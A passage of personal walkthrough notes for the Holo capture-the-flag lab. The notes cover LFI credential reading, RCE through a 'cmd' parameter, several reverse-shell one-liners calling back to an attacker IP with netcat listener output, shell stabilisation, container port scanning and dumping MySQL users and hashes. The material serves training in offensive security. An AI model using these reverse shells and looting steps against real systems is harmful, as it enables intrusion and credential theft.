000000288:   200        251 L    1128 W     7676 Ch     "/etc/apache2/mods-enabled/mi
                                                        me.conf"                     
000000291:   200        29 L     102 W      749 Ch      "/etc/apache2/mods-enabled/st
                                                        atus.conf"                   
000000292:   200        15 L     46 W       320 Ch      "/etc/apache2/ports.conf"    
000000310:   200        149 L    212 W      6077 Ch     "/etc/ca-certificates.conf"  
000000304:   200        71 L     329 W      2319 Ch     "/etc/bash.bashrc"           
000000324:   200        1 L      1 W        11 Ch       "/etc/debian_version"        
000000326:   200        20 L     99 W       604 Ch      "/etc/deluser.conf"          
000000323:   200        83 L     485 W      2969 Ch     "/etc/debconf.conf"          
000000343:   200        1 L      1 W        13 Ch       "/etc/hostname"              
000000342:   200        3 L      18 W       92 Ch       "/etc/host.conf"             
000000339:   200        41 L     41 W       475 Ch      "/etc/group"                 
000000340:   200        40 L     40 W       459 Ch      "/etc/group-"                
000000365:   200        17 L     40 W       332 Ch      "/etc/ldap/ldap.conf"        
000000364:   200        2 L      2 W        34 Ch       "/etc/ld.so.conf"            
000000367:   200        341 L    1753 W     10550 Ch    "/etc/login.defs"            
000000360:   200        1 L      3 W        19 Ch       "/etc/issue.net"             
000000394:   200        12 L     17 W       386 Ch      "/etc/os-release"            
000000396:   200        15 L     59 W       552 Ch      "/etc/pam.conf"              
000000398:   200        20 L     25 W       967 Ch      "/etc/passwd-"               
000000432:   200        65 L     412 W      2179 Ch     "/etc/security/time.conf"    
000000429:   200        73 L     499 W      2972 Ch     "/etc/security/pam_env.conf" 
000000431:   200        11 L     70 W       419 Ch      "/etc/security/sepermit.conf"
000000427:   200        28 L     217 W      1440 Ch     "/etc/security/namespace.conf
                                                        "                            
000000426:   200        56 L     347 W      2150 Ch     "/etc/security/limits.conf"  
000000419:   200        122 L    802 W      4620 Ch     "/etc/security/access.conf"  
000000423:   200        106 L    663 W      3635 Ch     "/etc/security/group.conf"   
000000460:   200        3 L      14 W       77 Ch       "/etc/sysctl.d/10-console-mes
                                                        sages.conf"                  
000000459:   200        77 L     339 W      2683 Ch     "/etc/sysctl.conf"           
000000461:   200        12 L     69 W       509 Ch      "/etc/sysctl.d/10-network-sec
                                                        urity.conf"                  
000000552:   200        14 L     233 W      2100 Ch     "/proc/net/tcp"              
000000551:   200        58 L     114 W      532 Ch      "/proc/devices"              
000000553:   200        2 L      28 W       256 Ch      "/proc/net/udp"              
000000573:   200        1 L      52 W       311 Ch      "/proc/self/stat"            
000000574:   200        55 L     133 W      1303 Ch     "/proc/self/status"          
000000572:   200        36 L     216 W      3410 Ch     "/proc/self/mounts"          
000000554:   200        0 L      1 W        27 Ch       "/proc/self/cmdline"         
000000727:   200        88 L     467 W      3028 Ch     "/usr/share/adduser/adduser.c
                                                        onf"                         

Total time: 28.48714
Processed Requests: 877
Filtered Requests: 800
Requests/sec.: 30.78582
```
What file is vulnerable to LFI on the development domain?
Use the leaked paths or look at talents.php to find the page vulnerable to LFI.
*img.php*
What parameter in the file is vulnerable to LFI?
You can fuzz for this parameter or you can find it from the talents.php page
*file*
What file found from the information leak returns an HTTP error code 403 on the administrator domain?
*/var/www/admin/supersecretdir/creds.txt*
Using LFI on the development domain read the above file. What are the credentials found from the file?
Use the vulnerable parameter to read the full path of the file.
*admin:DBManagerLogin!*
Now that you have access to the administrator subdomain, you can fuzz for remote code execution and attempt to identify a specific parameter that you can exploit to gain arbitrary access to the machine.
Remote code execution, also known as arbitrary code execution, allows you to execute commands or code on a remote system. RCE can often exploit this by controlling a parameter utilized by a web server.
One method of attempting to identify RCE is by fuzzing for a vulnerable parameter using Wfuzz. Similar to how we used Wfuzz for asset discovery. The syntax is the same as previous commands; however, this time we will replace the `FUZZ` command at the end along with a `?` so that the complete `FUZZ` parameter is `?FUZZ=ls+-la` Find an example below from the test environment.
Syntax: `wfuzz -u <http://example.com/?FUZZ=ls+-la> -w <wordlist> --hw 2`
We suggest using the Seclists "big.txt" for fuzzing RCE parameters.
Now that we know we can control the parameter, we can attempt to gain RCE on the box. Find an example below from the test environment.
Command used: `curl -vvv http://localhost:8080/test.php?cmd=ls+-la && echo ""`
Rather than fuzzing all the pages that we find to identify RCE, we can utilize code analysis to look at the code running on a page and infer whether or not the code may be vulnerable. Find an example below of how code can run a command and is vulnerable to an attacker controlling the parameter.
`<?php    $id = $_GET["cmd"];   if ($_GET["cmd"] == NULL){   echo "Hello " . exec("whoami") . "!";   } else {   echo "Hello " . exec($id);   }   ?>`
To identify RCE, you can decide whether you want to fuzz parameters of files or you want to review the source code of a file. Your approach may also differ depending on the scenario you are in and what resources or footholds you have at your disposal.
Once you have RCE on the system, you can use a reverse shell such as netcat to gain a shell on the box. Refer to the following cheat sheet for help with reverse shells. [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
Answer the questions below
![[Pasted image 20230131112334.png]]
![[Pasted image 20230131120258.png]]
```text
view-source:http://admin.holo.live/dashboard.php

<!--//if ($_GET['cmd'] === NULL) { echo passthru("cat /tmp/Views.txt"); } else { echo passthru($_GET['cmd']);} -->

or another way
```
```text
┌──(kali㉿kali)-[~/Downloads/hacked]
└─$ wfuzz -b PHPSESSID=c737kfeuf6qa50n48s79ao2g61 -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt --hw 1052 http://admin.holo.live/dashboard.php?FUZZ=id
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://admin.holo.live/dashboard.php?FUZZ=id
Total requests: 3132

=====================================================================
ID           Response   Lines    Word       Chars       Payload                      
=====================================================================

000000358:   200        394 L    1054 W     15920 Ch    "cmd" 

http://admin.holo.live/dashboard.php?cmd=whoami

www-data

http://admin.holo.live/dashboard.php?cmd=cat+/etc/passwd
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false Visitors today

https://www.urlencoder.org/

rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.8.19.103%204444%20%3E%2Ftmp%2Ff

uhmm not work  also doing with burp
```
```text
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444

download hacktools extension

/bin/bash -c 'exec bash -i &>/dev/tcp/10.8.19.103/8443 <&1'

jaja 😂

my vpn-ip was other so restarted my machine

http://admin.holo.live/dashboard.php?cmd=nc+-e+/bin/sh+10.50.104.206+4444

now works , prolly the others also work

revshell
```
```text
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.200.108.33.
Ncat: Connection from 10.200.108.33:54506.
whoami
www-data
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@44e16cf97cc5:/var/www/admin$
```
```text
┌──(kali㉿kali)-[~]
└─$ stty -a                   
speed 38400 baud; rows 16; columns 94; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>;
swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V;
discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany
-imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke
-flusho -extproc
```
```text
┌──(kali㉿kali)-[~]
└─$ echo $TERM
xterm-256color

stabilize shell
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

www-data@44e16cf97cc5:/var/www/admin$ 
zsh: suspended  rlwrap nc -lvnp 4444 (Ctrl+Z)
```
```text
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg         
[2]  - continued  rlwrap nc -lvnp 4444
www-data@44e16cf97cc5:/var/www/admin$ export SHELL=bash
export SHELL=bash
www-data@44e16cf97cc5:/var/www/admin$ export TERM=xterm-256color
export TERM=xterm-256color
www-data@44e16cf97cc5:/var/www/admin$ stty rows 16 columns 94
stty rows 16 columns 94
www-data@44e16cf97cc5:/var/www/admin$ 

www-data@44e16cf97cc5:/var/www/admin$ reset

:)
```
What file is vulnerable to RCE on the administrator domain?
Source code analysis or fuzzing parameters.
*dashboard.php*
What parameter is vulnerable to RCE on the administrator domain?
Fuzz for parameters on the file in the previous question.
*cmd*
What user is the web server running as?
whoami
*www-data*
Now that we have a shell on the box, we want to stabilize our shell. For the most part, stabilizing shells is straightforward by using other utilities like python to help; however, some steps can take longer or change depending on the shell you use. The below instructions will be for bash and ZSH; any other shells or operating systems, you will need to do your research on stabilizing shells within their environment.
Instructions found throughout this room are inspired by this fantastic blog post, [https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/). All credit for the techniques shown goes to ropnop.
There are several ways to stabilize a shell; we will be focusing on using python to create a pseudo-terminal and modifying stty options. The steps are the same for all target machines, but they may differ depending on the shell or operating system used on your attacking machine.
To begin, we will create a pseudo-terminal using python. The command can be found below.
Syntax: `python -c 'import pty; pty.spawn("/bin/bash")'`
Once we have a pseudo shell, we can pause the terminal and modify stty options to optimize the terminal. Follow the steps below exactly for bash shells.
1. `stty raw -echo`
2. `fg`
**Note****:** If you're using ZSH, you **must** combine `stty raw -echo;fg` onto one line, or else your shell will break
At this point, you will get your pseudo-terminal back, but you may notice that whatever you type does not show up. For the next step, you will need to type blindly.
3. `reset`
4. `export SHELL=BASH`
For the next two steps, you will need to use the information you got from step 1.
5. `export SHELL=BASH`
6. `export TERM=<TERMINAL>`
7. `stty rows <num> columns <cols>`
Answer the questions below
Stabilize your shell on L-SRV01.
### Situational Awareness Docker? I hardly even know her!
Now that we have gained a shell onto the webserver, we need to perform some situational awareness to figure out where we are. We know from looking through some files when we exploited LFI that this may be a container. We can run some further enumeration and information gathering to identify whether that is true or not and anyway misconfigurations that might allow us to escape the container.
From the Docker documentation, "A container is a standard unit of software that packages up code and all its dependencies, so the application runs quickly and reliably from one computing environment to another. A Docker container image is a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries, and settings."
![](https://i.imgur.com/2oFwU49.png)
Containers have networking capabilities and their own file storage. They achieve this by using three components of the Linux kernel:
-   Namespaces
-   Cgroups
-   OverlayFS
But we're only going to be interested in namespaces here; after all, they lay at the heart of it. Namespaces essentially segregate system resources such as processes, files, and memory away from other namespaces.
Every process running on Linux will be assigned a PID and a namespace.
Namespaces are how containerization is achieved! Processes can only "see" the process that is in the same namespace - no conflicts in theory. Take Docker; for example, every new container will be running as a new namespace, although the container may be running multiple applications (and, in turn, processes).
Let's prove the concept of containerization by comparing the number of processes there are in a Docker container that is running a web server versus the host operating system at the time.
We can look for various indicators that have been placed into a container. Containers, due to their isolated nature, will often have very few processes running in comparison to something such as a virtual machine. We can simply use `ps aux` to print the running processes. Note in the screenshot below that there are very few processes running?
Command used: `ps aux`
![](https://i.imgur.com/NkdQRCE.png)
Containers allow environment variables to be provided from the host operating system by the use of a `.dockerenv` file. This file is located in the "/" directory and would exist on a container - even if no environment variables were provided.
Command used: `cd / && ls -lah`
![](https://i.imgur.com/YbH0rGm.png)
Cgroups are used by containerization software such as LXC or Docker. Let's look for them by navigating to `/proc/1` and then catting the "cgroup" file... It is worth mentioning that the "cgroups" file contains paths including the word "docker".
![](https://i.imgur.com/LxU3w2p.png)
Answer the questions below
Read the above section and familiarize yourself with your new environment
Completed
Submit the flag on L-SRV02
Completed
*HOLO{175d7322f8fc53392a417ccde356c3fe}*
```text
www-data@44e16cf97cc5:/var/www/admin$ cd / && ls -lah
cd / && ls -lah
total 340K
drwxr-xr-x   1 root root 4.0K Jan 31 21:54 .
drwxr-xr-x   1 root root 4.0K Jan 31 21:54 ..
-rwxr-xr-x   1 root root    0 Jan 31 21:54 .dockerenv
-rw-r--r--   1 root root 260K Jan  4  2021 apache.tar
drwxr-xr-x   1 root root 4.0K Jan 16  2021 bin
drwxr-xr-x   2 root root 4.0K Apr 24  2018 boot
drwxr-xr-x   5 root root  360 Jan 31 21:54 dev
drwxr-xr-x   1 root root 4.0K Jan 31 21:54 etc
drwxr-xr-x   2 root root 4.0K Apr 24  2018 home
drwxr-xr-x   1 root root 4.0K May 23  2017 lib
drwxr-xr-x   1 root root 4.0K Jan 16  2021 lib64
drwxr-xr-x   2 root root 4.0K Sep 21  2020 media
drwxr-xr-x   2 root root 4.0K Sep 21  2020 mnt
drwxr-xr-x   2 root root 4.0K Sep 21  2020 opt
dr-xr-xr-x 143 root root    0 Jan 31 21:54 proc
drwx------   2 root root 4.0K Sep 21  2020 root
drwxr-xr-x   1 root root 4.0K Jan 16  2021 run
drwxr-xr-x   1 root root 4.0K Jan 16  2021 sbin
drwxr-xr-x   2 root root 4.0K Sep 21  2020 srv
dr-xr-xr-x  13 root root    0 Jan 31 21:54 sys
drwxrwxrwt   1 root root 4.0K Jan 31 21:54 tmp
drwxr-xr-x   1 root root 4.0K Sep 21  2020 usr
drwxr-xr-x   1 root root 4.0K Jan 16  2021 var

www-data@44e16cf97cc5:/$ cat /proc/1/cgroup
cat /proc/1/cgroup
12:freezer:/docker/44e16cf97cc523db15e7f704d63480609c9f1ec2ccf4da9d107df74515d48a3f
11:memory:/docker/44e16cf97cc523db15e7f704d63480609c9f1ec2ccf4da9d107df74515d48a3f
10:rdma:/
9:pids:/docker/44e16cf97cc523db15e7f704d63480609c9f1ec2ccf4da9d107df74515d48a3f
8:hugetlb:/docker/44e16cf97cc523db15e7f704d63480609c9f1ec2ccf4da9d107df74515d48a3f
7:cpu,cpuacct:/docker/44e16cf97cc523db15e7f704d63480609c9f1ec2ccf4da9d107df74515d48a3f
6:blkio:/docker/44e16cf97cc523db15e7f704d63480609c9f1ec2ccf4da9d107df74515d48a3f
5:devices:/docker/44e16cf97cc523db15e7f704d63480609c9f1ec2ccf4da9d107df74515d48a3f
4:perf_event:/docker/44e16cf97cc523db15e7f704d63480609c9f1ec2ccf4da9d107df74515d48a3f
3:cpuset:/docker/44e16cf97cc523db15e7f704d63480609c9f1ec2ccf4da9d107df74515d48a3f
2:net_cls,net_prio:/docker/44e16cf97cc523db15e7f704d63480609c9f1ec2ccf4da9d107df74515d48a3f
1:name=systemd:/docker/44e16cf97cc523db15e7f704d63480609c9f1ec2ccf4da9d107df74515d48a3f
0::/system.slice/containerd.service

www-data@44e16cf97cc5:/proc/1$ ls
ls
arch_status	 cpuset   loginuid    numa_maps      sched	   status
attr		 cwd	  map_files   oom_adj	     schedstat	   syscall
autogroup	 environ  maps	      oom_score      sessionid	   task
auxv		 exe	  mem	      oom_score_adj  setgroups	   timers
cgroup		 fd	  mountinfo   pagemap	     smaps	   timerslack_ns
clear_refs	 fdinfo   mounts      patch_state    smaps_rollup  uid_map
cmdline		 gid_map  mountstats  personality    stack	   wchan
comm		 io	  net	      projid_map     stat
coredump_filter  limits   ns	      root	     statm
www-data@44e16cf97cc5:/proc/1$ cd /home
cd /home
www-data@44e16cf97cc5:/home$ ls
ls
www-data@44e16cf97cc5:/home$ ls -lah
ls -lah
total 8.0K
drwxr-xr-x 2 root root 4.0K Apr 24  2018 .
drwxr-xr-x 1 root root 4.0K Jan 31 21:54 ..
www-data@44e16cf97cc5:/home$ cd /var
cd /var
www-data@44e16cf97cc5:/var$ ls
ls
backups  cache	lib  local  lock  log  mail  opt  run  spool  tmp  www
www-data@44e16cf97cc5:/var$ cd www
cd www
www-data@44e16cf97cc5:/var/www$ ls
ls
admin  dev  html  user.txt  web.tar  wordpress
www-data@44e16cf97cc5:/var/www$ cat user.txt
cat user.txt
HOLO{175d7322f8fc53392a417ccde356c3fe}
```
### Situational Awareness Living off the LANd
We now know that we are in a docker container. Since we know that we are in a docker container, we can continue with situation awareness and enumeration to determine what we can do and what other paths we can take to continue attacking this server. A critical part of situational awareness is identifying network and host information. This can be done via port scanning and network tooling.
In this task, we will be covering using what we have at our disposal in a limited environment to gain information and awareness of the environment. We will showcase both bash and python port scanners that you can utilize as both are common to have inside of a system or container and other tricks that can be used, such as Netcat and statically compiled binaries.
The first method of port scanning we will be covering is using bash. In bash, we can utilize `/dev/tcp/ipaddr/port`; this will act as a built-in scanner to gather information on the container ports. This utility is broken down below.
-   `/dev/` contains all hardware devices, such as NIC, HDD, SSD, RAM
-   `/dev/tcp/` pseudo-device of your ethernet/wireless card opens a socket when data is directed either in or out.
For more information about this, check out the Linux Documentation Project. [https://tldp.org/LDP/abs/html/devref1.html](https://tldp.org/LDP/abs/html/devref1.html)
We can use this to our advantage to scan internal ports by piping a list of ports into it. Find an example of a full bash port scanner below.
`#!/bin/bash   ports=(21 22 53 80 443 3306 8443 8080)   for port in ${ports[@]}; do   timeout 1 bash -c "echo \"Port Scan Test\" > /dev/tcp/1.1.1.1/$port && echo $port is open || /dev/null"    done`
The second method of port scanning we will cover is using python. To scan ports with python, we will need to use the `sockets` library to open connections and enable network connectivity. The script itself is as simple as opening connections to sequencing ports in a loop. Find an example of the full python port scanner below.
`#!/usr/bin/python3   import socket   host = "1.1.1.1"   portList = [21,22,53,80,443,3306,8443,8080]   for port in portList:    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    try:     s.connect((host,port))     print("Port ", port, " is open")    except:     print("Port ", port, " is closed")`
The mainline of code doing all the work is `socket.AF_INET, socket.SOCK_STREAM` this will be a precursor to opening a connection to the specified host and port.
The third method we will look at is unique and uses Netcat to connect to a range of ports. Netcat is a reasonably common utility on all Linux boxes, so it is safe to assume that we will always have it at our disposal. Find example syntax below.
Syntax: `nc -zv 192.168.100.1 1-65535`
Along with these living off-the-land scripts, we can also utilize statically compiled binaries. A statically compiled binary is similar to any other binary with all libraries and dependencies included in the binary. This makes it so that you can run the binary on any system with the same architecture (x86, x64, ARM, etc). There are several places that you can download these binaries and compile them yourselves. Check out this GitHub for a list of stable binaries. [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries).
Answer the questions below
Read the above and scan ports on the container gateway
Completed
What is the Default Gateway for the Docker Container?
*192.168.100.1*
What is the high web port open in the container gateway?
*8080*
What is the low database port open in the container gateway?
*3306*
```bash
──(kali㉿kali)-[~]
└─$ mkdir Holo
```
```bash
┌──(kali㉿kali)-[~]
└─$ cd Holo
```
```bash
┌──(kali㉿kali)-[~/Holo]
└─$ nano bash_scan.sh
```
```bash
┌──(kali㉿kali)-[~/Holo]
└─$ bash bash_scan.sh                      
53 is open
80 is open
443 is open
8443 is open
8080 is open
```
```bash
┌──(kali㉿kali)-[~/Holo]
└─$ cat bash_scan.sh       
#!/bin/bash
ports=(21 22 53 80 443 3306 8443 8080)
for port in ${ports[@]}; do
timeout 1 bash -c "echo \"Port Scan Test\" > /dev/tcp/1.1.1.1/$port && echo $port is open || /dev/null" 
done
```
```bash
┌──(kali㉿kali)-[~/Holo]
└─$ ping 1.1.1.1               
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
64 bytes from 1.1.1.1: icmp_seq=1 ttl=128 time=14.8 ms
64 bytes from 1.1.1.1: icmp_seq=2 ttl=128 time=17.5 ms
^C
--- 1.1.1.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1016ms
rtt min/avg/max/mdev = 14.788/16.167/17.547/1.379 ms
```
```bash
┌──(kali㉿kali)-[~/Holo]
└─$ nano python_scan.py
```
```bash
┌──(kali㉿kali)-[~/Holo]
└─$ python3 python_scan.py     
Port  21  is closed
Port  22  is closed
Port  53  is open
Port  80  is open
Port  443  is open
Port  3306  is closed
Port  8443  is open
Port  8080  is open
```
```bash
┌──(kali㉿kali)-[~/Holo]
└─$ cat python_scan.py  
#!/usr/bin/python3
import socket
host = "1.1.1.1"
portList = [21,22,53,80,443,3306,8443,8080]
for port in portList:
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
  s.connect((host,port))
  print("Port ", port, " is open")
 except:
  print("Port ", port, " is closed")
```
```bash
┌──(kali㉿kali)-[~/Holo]
└─$ nc -zv 1.1.1.1 80
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 1.1.1.1:80.
Ncat: 0 bytes sent, 0 bytes received in 0.12 seconds.

another ways

for i in {1..10000};do 2>/dev/null > /dev/tcp/1.1.1.1/$i && echo Port $i open;done
for port in {1..10000}; do timeout 2 nc -znv 1.1.1.1 $port 2>&1 | grep open ; done

www-data@44e16cf97cc5:/var/www/admin$ ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.100.100  netmask 255.255.255.0  broadcast 192.168.100.255
        ether 02:42:c0:a8:64:64  txqueuelen 0  (Ethernet)
        RX packets 6025  bytes 443465 (443.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5387  bytes 11078485 (11.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 482  bytes 284969 (284.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 482  bytes 284969 (284.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

The gateway of the container can be determined with `arp -a`

www-data@44e16cf97cc5:/var/www/admin$ arp -a
arp -a
ip-192-168-100-1.eu-west-1.compute.internal (192.168.100.1) at 02:42:f9:82:98:8f [ether] on eth0

or another way

www-data@44e16cf97cc5:/var/www/admin$ route -nv
route -nv
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         192.168.100.1   0.0.0.0         UG    0      0        0 eth0
192.168.100.0   0.0.0.0         255.255.255.0   U     0      0        0 eth0

www-data@44e16cf97cc5:/var/www/admin$ for i in {1..10000};do 2>/dev/null > /dev/tcp/192.168.100.1/$i && echo Port $i open;done
0.1/$i && echo Port $i open;donell > /dev/tcp/192.168.100
Port 22 open
Port 80 open
Port 3306 open
Port 8080 open

www-data@44e16cf97cc5:/var/www/admin$ for port in {1..20000}; do timeout 2 nc -znv 192.168.100.1 $port 2>&1 | grep open ; done
.1 $port 2>&1 | grep open ; doneut 2 nc -znv 192.168.100.
(UNKNOWN) [192.168.100.1] 22 (ssh) open
(UNKNOWN) [192.168.100.1] 80 (http) open
(UNKNOWN) [192.168.100.1] 1194 (openvpn) : Connection refused
(UNKNOWN) [192.168.100.1] 3306 (mysql) open
(UNKNOWN) [192.168.100.1] 8080 (http-alt) open
```
|Proveedor|DNS Primario|DNS Secundario|
|-------------|-----------------|--------------------|
|Google|8.8.8.8|8.8.4.4|
|Quad9|9.9.9.9|149.112.112.112|
|OpenDNS Home|208.67.222.222|208.67.220.220|
|Cloudflare|1.1.1.1|1.0.0.1|
### Situational Awareness Dorkus Storkus - Protector of the Database
Continuing with situational awareness, we can begin looking for any interesting configuration files or other pieces of information that we can gather without actively exploiting the box. We can also attempt to loot services on the device, such as MySQL.
Since we know the server we are attacking is a web server, we can assume it runs some SQL or database on the backend. Often, these databases may be secure from someone accessing them from the outside, but when on the server, they are often very insecure and can openly read the configuration files.
When we get onto a server running MySQL, we can begin our situational awareness and information looting/exfiltration by reading the `db_connect.php` file. Web servers require this file to connect PHP and SQL. This file is often not readable externally, but you can easily read it and obtain information from it if you have access to an insecure internal server. This file will typically be present at the root of the web page, such as `/var/www`. Find an example of this configuration file below.
`<?php   define('DB_SRV', '127.0.0.1');   define('DB_PASSWD', 'password');   define('DB_USER', 'username');   define('DB_NAME', 'database');   $connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);   ?>`
As you can see, we can get much important information from this file: server address, password, username, database name. This can help us to then access and loot the database. It is essential to understand the scope and what information you can and cant exfiltrate and loot. Before exfiltration, you should have clear communication and plans with your target. Hololive has permitted you to exfiltrate names and passwords within the "DashboardDB" database in this engagement.
To access the database, you will need to utilize a binary of the database access tool used. The database will often be MySQL; however, this can change from server to server, and location may also vary. To use MySQL, you will only need to specify the username using `-u`. You will also need to specify the `-p` parameter; however, it does not take an argument.
When directly accessing a database using MySQL, it will put you into a local database hosted on the machine. You can also use MySQL to access remote databases using the `-h` parameter. Find an example of usage below.
Syntax: `mysql -u <username> -p -h 127.0.0.1`
If successful, we should now have access to a remote database. From here, we can use SQL syntax to navigate and utilize the database. We will be covering a few essential SQL commands that you can use to understand how to navigate a SQL database quickly. For more information, check out the MySQL documentation. [https://dev.mysql.com/doc/](https://dev.mysql.com/doc/).
-   `show databases;` provides a list of available databases.
-   `use <database>;` navigates to the provided database.
-   `show tables;` provides a list of available tables within the database.
-   `show columns from <table>;` outputs columns of the provided table.
-   `select * from <table>;` outputs all contents of the provided table.
Answer the questions below
What is the server address of the remote database?
*192.168.100.1*
What is the password of the remote database?
*!123SecureAdminDashboard321!*
What is the username of the remote database?
*admin*
What is the database name of the remote database?
*DashboardDB*
What username can be found within the database itself?
*gurag*
```text
www-data@44e16cf97cc5:/var/www/admin$ cat db_connect.php
cat db_connect.php
<?php

define('DB_SRV', '192.168.100.1');
define('DB_PASSWD', "!123SecureAdminDashboard321!");
define('DB_USER', 'admin');
define('DB_NAME', 'DashboardDB');

$connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);

if($connection == false){

        die("Error: Connection to Database could not be made." . mysqli_connect_error());
}
?>

www-data@2e332f92060f:/var/www/admin$ mysql -h 192.168.100.1 -u admin -p
mysql -h 192.168.100.1 -u admin -p
Enter password: !123SecureAdminDashboard321!

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 8.0.22-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show tables;
show tables;
ERROR 1046 (3D000): No database selected
mysql> sshow databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| DashboardDB        |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use DashboardDB;
use DashboardDB;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-----------------------+
| Tables_in_DashboardDB |
+-----------------------+
| users                 |
+-----------------------+
1 row in set (0.00 sec)

mysql> select * from users;
select * from users;
+----------+-----------------+
| username | password        |
+----------+-----------------+
| admin    | DBManagerLogin! |
| gurag    | AAAA            |
+----------+-----------------+
2 rows in set (0.00 sec)

mysql> SELECT host,User,authentication_string FROM mysql.user
SELECT host,User,authentication_string FROM mysql.user
    -> ;
;
+-----------+------------------+------------------------------------------------------------------------+
| host      | User             | authentication_string                                                  |
+-----------+------------------+------------------------------------------------------------------------+
| %         | admin            | *02D701F019C45F2BE1D152EA4509C139974EE8B2                              |
| %         | administrator    | $A$005$)k<W	S[3i:9C7dd9Eu6xL/ojODpSLvhIIwFtLVE6zEzZgOF7eYuMoC42A |
| localhost | debian-sys-maint | $A$005$U,n)j%9RH"KBY
                                                     MeYqasnTpT0Ah/QLu8ozAfGjmRknDsw2Kvq1YossNVX99 |
| localhost | mysql.infoschema | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |
| localhost | mysql.session    | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |
| localhost | mysql.sys        | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |
| localhost | root             |                                                                        |
+-----------+------------------+------------------------------------------------------------------------+
7 rows in set (0.00 sec)
```
### Docker Breakout Making Thin Lizzy Proud
